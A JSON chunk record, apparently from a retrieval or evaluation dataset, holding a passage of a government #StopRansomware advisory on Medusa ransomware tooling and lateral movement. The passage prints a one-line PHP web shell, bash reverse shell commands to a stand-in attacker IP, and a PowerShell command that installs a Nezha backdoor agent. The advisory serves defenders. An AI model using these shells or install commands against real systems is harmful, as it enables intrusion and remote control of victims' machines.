@@ -1,0 +1,22 @@
+{
+  "chunk_id": "AA25-071A:evaluation:llama500:12220:14519",
+  "doc_id": "AA25-071A",
+  "start": 12220,
+  "end": 14519,
+  "text": "Updated Aug. 18, 2026) FBI has also observed Medusa actors using:\nNezha\nAn operations and maintenance server monitoring tool used to allow backdoor visibility to compromised hosts from the threat actor’s machine.\nPublicly available on GitHub.\nInstalled using PowerShell on victim’s machine:\n$env:NZ_SERVER=\"83.138.53.139:80\";$env:NZ_TLS=\"false\";$env:NZ_CLIENT_SECRET=\"…\"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12;set-ExecutionPolicy RemoteSigned;Invoke-WebRequest https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.ps1 -OutFile C:install.ps1;powershell.exe C:install.ps1\nMeshAgent\nMeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.\nPublicly available on GitHub.\nApache/PHP Web Shell\nfile_save.php executes the contents of a POST request sent to /file_save on a victim web server. For contents of file_save.php, see below:\n<?php if($_REQUEST[‘key’]==’UerT’) system($_REQUEST[‘x’]);?>\nBash Reverse Shell\nUse of native Linux commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure:\nbash -i >& /dev/tcp/<attacker IP>/4444 0>&1\nbash -i >& /dev/tcp/<attacker IP>/443 0>&1\nGSocket\nAlso known as Global Socket or gs-netcat.\nAllows workstations on different private networks to connect and bypass firewalls.\nAllows file transfers and command execution.\nLateral Movement, Credential Access, and Execution\n(Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219]. To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:\n",
+  "inherited_context": [
+    {
+      "start": 23,
+      "end": 57,
+      "text": "#StopRansomware: Medusa Ransomware"
+    },
+    {
+      "start": 4834,
+      "end": 4851,
+      "text": "Technical Details"
+    }
+  ],
+  "role": "extraction",
+  "parent_extraction_chunk_id": null,
+  "embedding": null
+}
